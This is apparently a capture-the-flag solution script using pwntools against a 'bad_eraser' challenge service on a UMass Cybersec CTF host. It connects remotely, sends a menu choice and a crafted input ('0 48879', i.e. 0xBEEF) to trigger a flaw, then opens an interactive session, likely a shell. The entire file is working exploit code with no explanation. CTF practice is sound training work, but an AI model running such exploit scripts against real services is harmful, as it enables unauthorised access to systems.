from pwn import *

#p = process("./bad_eraser")
p = remote("bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org", 45002)
p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"Enter mold id and pigment code.\n", b"0 48879")
p.sendlineafter(b"> ", b"3")
p.interactive()